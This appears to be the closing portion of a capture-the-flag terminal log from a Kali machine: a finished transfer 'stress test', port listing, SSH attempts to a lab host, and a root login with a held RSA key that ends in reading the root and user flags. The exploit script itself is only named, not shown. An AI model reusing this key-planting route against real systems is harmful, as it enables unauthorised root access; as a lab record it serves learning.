Progress: 18600/21504 chunks (0.02 GB/s)
Progress: 18650/21504 chunks (0.02 GB/s)
Progress: 18700/21504 chunks (0.02 GB/s)
Progress: 18750/21504 chunks (0.02 GB/s)
Progress: 18800/21504 chunks (0.02 GB/s)
Progress: 18850/21504 chunks (0.02 GB/s)
Progress: 18900/21504 chunks (0.02 GB/s)
Progress: 18950/21504 chunks (0.02 GB/s)
Progress: 19000/21504 chunks (0.02 GB/s)
Progress: 19050/21504 chunks (0.02 GB/s)
Progress: 19100/21504 chunks (0.02 GB/s)
Progress: 19150/21504 chunks (0.02 GB/s)
Progress: 19200/21504 chunks (0.02 GB/s)
Progress: 19250/21504 chunks (0.02 GB/s)
Progress: 19300/21504 chunks (0.02 GB/s)
Progress: 19350/21504 chunks (0.02 GB/s)
Progress: 19400/21504 chunks (0.02 GB/s)
Progress: 19450/21504 chunks (0.02 GB/s)
Progress: 19500/21504 chunks (0.02 GB/s)
Progress: 19550/21504 chunks (0.02 GB/s)
Progress: 19600/21504 chunks (0.02 GB/s)
Progress: 19650/21504 chunks (0.02 GB/s)
Progress: 19700/21504 chunks (0.02 GB/s)
Progress: 19750/21504 chunks (0.02 GB/s)
Progress: 19800/21504 chunks (0.02 GB/s)
Progress: 19850/21504 chunks (0.02 GB/s)
Progress: 19900/21504 chunks (0.02 GB/s)
Progress: 19950/21504 chunks (0.02 GB/s)
Progress: 20000/21504 chunks (0.02 GB/s)
Progress: 20050/21504 chunks (0.02 GB/s)
Progress: 20100/21504 chunks (0.02 GB/s)
Progress: 20150/21504 chunks (0.02 GB/s)
Progress: 20200/21504 chunks (0.02 GB/s)
Progress: 20250/21504 chunks (0.02 GB/s)
Progress: 20300/21504 chunks (0.02 GB/s)
Progress: 20350/21504 chunks (0.02 GB/s)
Progress: 20400/21504 chunks (0.02 GB/s)
Progress: 20450/21504 chunks (0.02 GB/s)
Progress: 20500/21504 chunks (0.02 GB/s)
Progress: 20550/21504 chunks (0.02 GB/s)
Progress: 20600/21504 chunks (0.02 GB/s)
Progress: 20650/21504 chunks (0.02 GB/s)
Progress: 20700/21504 chunks (0.02 GB/s)
Progress: 20750/21504 chunks (0.02 GB/s)
Progress: 20800/21504 chunks (0.02 GB/s)
Progress: 20850/21504 chunks (0.02 GB/s)
Progress: 20900/21504 chunks (0.02 GB/s)
Progress: 20950/21504 chunks (0.02 GB/s)
Progress: 21000/21504 chunks (0.02 GB/s)
Progress: 21050/21504 chunks (0.02 GB/s)
Progress: 21100/21504 chunks (0.02 GB/s)
Progress: 21150/21504 chunks (0.02 GB/s)
Progress: 21200/21504 chunks (0.02 GB/s)
Progress: 21250/21504 chunks (0.02 GB/s)
Progress: 21300/21504 chunks (0.02 GB/s)
Progress: 21350/21504 chunks (0.02 GB/s)
Progress: 21400/21504 chunks (0.02 GB/s)
Progress: 21450/21504 chunks (0.02 GB/s)
Progress: 21500/21504 chunks (0.02 GB/s)
Progress: 21504/21504 chunks (0.02 GB/s)

Stress test complete:
  Total: 21.00 GB
  Time: 1002.68s
  Avg Speed: 0.02 GB/s

┌──(root㉿kali)-[~]
└─# ss -tulnp
Netid    State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process
tcp      LISTEN    0         4096              127.0.0.1:35307              0.0.0.0:*        users:(("containerd",pid=788,fd=10))
tcp      LISTEN    0         128                 0.0.0.0:22                 0.0.0.0:*        users:(("sshd",pid=791,fd=7))
tcp      LISTEN    0         128                    [::]:22                    [::]:*        users:(("sshd",pid=791,fd=8))

┌──(root㉿kali)-[~]
└─# cat .ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDdTXqbLDA1SaHFoMYdA4WiHr5wydaaK+cKb2JbJTxb root@kali

┌──(root㉿kali)-[~]
└─# ssh root@192.168.100.13 -i .ssh/id_ed25519
The authenticity of host '192.168.100.13 (192.168.100.13)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:2: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.13' (ED25519) to the list of known hosts.
root@192.168.100.13's password:
Permission denied, please try again.
root@192.168.100.13's password:


┌──(root㉿kali)-[~]
└─# ls
1MB.bin  att.py  authorized_keys  authorized_keys.pub  id_rsa  id_rsa.pub

┌──(root㉿kali)-[~]
└─# cd .ssh

┌──(root㉿kali)-[~/.ssh]
└─# ls -la
total 28
drwx------ 2 root root 4096 Dec 31 00:46 .
drwx------ 9 root root 4096 Dec 31 01:16 ..
-rw------- 1 root root  399 Dec 31 00:46 id_ed25519
-rw-r--r-- 1 root root   91 Dec 31 00:46 id_ed25519.pub
-rw------- 1 root root 3369 Dec 28 15:47 id_rsa
-rw-r--r-- 1 root root  735 Dec 28 15:47 id_rsa.pub
-rw-r--r-- 1 root root  426 Dec 31 01:37 known_hosts

┌──(root㉿kali)-[~/.ssh]
└─# ssh -i id_rsa root@192.168.100.13
root@192.168.100.13's password:


┌──(root㉿kali)-[~/.ssh]
└─# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDd7+ylTjo41EhCYlg5Cqt10b5q+wd6KNXV7B81DT6XCdxMVu6lCsJhcDOf8EbnWt0FegwZOyXanXpG3VtOzkAj2LFY2fDbjKuOg99ngz2qAZgbRWTpB+2NEqYqfbtXq9aplyU0W5nDMmMf1cW9KQI8aLRfPBOd1CsZTTan8GSw7qYb3l+28GLywef60Tokc91iugi2kLI2alycuvs1MAZulrrs/N/uuTAAUn1VVGZfc6cLHvIcddlU0YX9qbR/Kpqnfuojg9CrTBidKPhMnaO+L5HyAzllE1n4TQ5Xpq6/8bpeJMIAxbUxi1yII5L5SUwGi06Qk6rmJCEEuKm53SG1v3Gjs34xfiONwX6Tdhb/xkM9DQZ5FrFWZd8xkwEtSLC+hcuhX/ozaiLYS1HQl1PMoOHMk6HleTQuzvyXvzmffZh/geGoXV3Un6eVnxIkja2bprmNFREiohqMAyxhQhToZJ4YfbjeZF5PbrA9MoP220aCBAITqfTq+q9HTKcsC0+PSCsqPwhW+pWEI3ilPt6f5cM3AT45vUb4HHG+gdQXJVFGrarAnAQIK5TfG3snMTTZZYj3ZYX/bckZr8lXlm9+EdF4gMK0cHrPPFHPM4qIFd0UXYcwjN2x3+6uP/j1aOyFXN4r5Df9EDi0ChwzhX3LPdphuvgo2PYpcr2ho9nZ0w== root@kali

┌──(root㉿kali)-[~/.ssh]
└─# ssh root@192.168.100.13 -i id_rsa
Linux 104567 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@104567:~# ls -la
total 32
drwx------  5 root root 4096 Aug 27 01:36 .
drwxr-xr-x 18 root root 4096 Aug 22 07:17 ..
lrwxrwxrwx  1 root root    9 Aug 27 01:36 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 Apr  4  2025 .gnupg
drwxr-xr-x  3 root root 4096 Mar 18  2025 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   44 Aug 22 08:22 root.txt
drw-------  2 root root 4096 Dec 30 13:36 .ssh
root@104567:~# cat /root/root.txt
flag{root-f526a6c9f285aa9d001a459b42ef3035}
root@104567:~# cat /home/ll/user.txt
flag{user-bc3c292e432690a9a0444bb46a559061}
root@104567:~# exit
logout
Connection to 192.168.100.13 closed.

┌──(root㉿kali)-[~/.ssh]
└─# ssh root@192.168.100.13 -i id_rsa
Linux 104567 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 30 13:41:18 2025 from 192.168.100.5
root@104567:~#
```